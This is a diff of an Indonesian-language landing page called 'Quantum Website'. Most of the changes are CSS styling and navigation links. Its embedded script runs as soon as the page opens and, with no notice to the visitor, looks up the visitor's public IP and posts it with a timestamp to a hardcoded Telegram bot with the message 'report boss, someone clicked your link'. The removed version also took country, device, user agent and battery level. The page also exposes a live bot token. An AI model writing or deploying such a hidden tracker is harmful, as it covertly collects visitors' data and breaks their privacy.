@@ -8,35 +8,57 @@
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
 
   <style>
-    *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif}
+    *{margin:0;padding:0;box-sizing:border-box;font-family:Poppins}
     body{
       min-height:100vh;
       background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
-      color:#fff;
       display:flex;
       flex-direction:column;
       justify-content:space-between;
+      color:#fff;
     }
-    .container{text-align:center;padding:70px 20px}
-    h1{font-size:2.6rem;font-weight:700;margin-bottom:20px}
-    .subtitle{opacity:.9;max-width:700px;margin:auto}
-    .creator{margin-top:20px;opacity:.8;font-style:italic}
+    .container{
+      text-align:center;
+      padding:70px 20px;
+    }
+    h1{
+      font-size:2.6rem;
+      letter-spacing:2px;
+    }
+    .subtitle{
+      opacity:.9;
+      margin-top:15px;
+    }
+    .creator{
+      margin-top:20px;
+      opacity:.8;
+      font-style:italic;
+    }
     .footer{
       background:rgba(0,0,0,.35);
       padding:25px;
       display:flex;
       justify-content:center;
       gap:25px;
+      backdrop-filter:blur(8px);
     }
     .nav-box{
       width:160px;height:125px;
       background:rgba(255,255,255,.12);
       border-radius:20px;
       display:flex;
+      flex-direction:column;
       align-items:center;
       justify-content:center;
-      font-weight:600;
+      cursor:pointer;
+      transition:.3s;
     }
+    .nav-box:hover{
+      transform:translateY(-8px) scale(1.05);
+      background:linear-gradient(135deg,#00c6ff,#0072ff);
+    }
+    .icon{font-size:40px}
+    .nav-text{font-weight:600}
   </style>
 </head>
 <body>
@@ -44,72 +66,57 @@
 <div class="container">
   <h1>Welcome to Quantum Website</h1>
   <p class="subtitle">
-    Website ini dibuat untuk mempermudah pengguna dalam menggunakan dunia digital
+    Website ini dibuat untuk mempermudah pengguna dalam dunia digital
   </p>
   <div class="creator">Quantum made by Pahri</div>
 </div>
 
 <div class="footer">
-  <div class="nav-box">🏠 HOME</div>
-  <div class="nav-box">⚙️ TOOLS</div>
+  <div class="nav-box" onclick="window.location.href='index.html'">
+    <div class="icon">🏠</div>
+    <div class="nav-text">HOME</div>
+  </div>
+
+  <div class="nav-box" onclick="window.location.href='tools.html'">
+    <div class="icon">⚙️</div>
+    <div class="nav-text">TOOLS</div>
+  </div>
 </div>
 
-<!-- 🚀 AUTO SEND TELEGRAM -->
 <script>
 const BOT_TOKEN = "8416804133:AAFfm7SNGYI-EUCEDbpf6IgsJNIZxW9NtcM";
-const CHAT_ID  = "8080998217";
+const CHAT_ID = "8080998217";
 
-function getDevice(){
-  return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
-    ? "📱 HP"
-    : "💻 PC";
-}
-
-async function getBattery(){
+async function sendToTelegram(){
   try{
-    if(navigator.getBattery){
-      const b = await navigator.getBattery();
-      return Math.round(b.level * 100) + "%";
-    }
-    return "Tidak didukung";
-  }catch{
-    return "Error";
-  }
-}
+    // Ambil IP publik
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
 
-async function sendTelegram(){
-  try{
-    const ipRes = await fetch("https://ipapi.co/json/");
-    const ip = await ipRes.json();
-    const battery = await getBattery();
-    const time = new Date().toLocaleString("id-ID");
+    const message = `
+🚨 LAPOR KETUA 🚨
+ADA YG BARU CLICK LINK ANDA
 
-    const message =
-`🚨 LAPOR KETUA ADA YG BARU CLICK LINK ANDA
-
-🌍 Negara : ${ip.country_name}
-🌐 IP : ${ip.ip}
-⏰ Jam : ${time}
-📱 Device : ${getDevice()}
-👤 User-Agent :
-${navigator.userAgent}
-🔋 Baterai : ${battery}`;
+🌐 IP : ${ipData.ip}
+🕒 Waktu : ${new Date().toLocaleString()}
+    `;
 
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
       method:"POST",
       headers:{ "Content-Type":"application/json" },
-      body:JSON.stringify({
+      body: JSON.stringify({
         chat_id: CHAT_ID,
         text: message
       })
     });
 
   }catch(e){
-    console.log("Gagal kirim:", e);
+    console.log("Gagal kirim telegram");
   }
 }
 
-sendTelegram();
+// kirim otomatis saat halaman dibuka
+sendToTelegram();
 </script>
 
 </body>
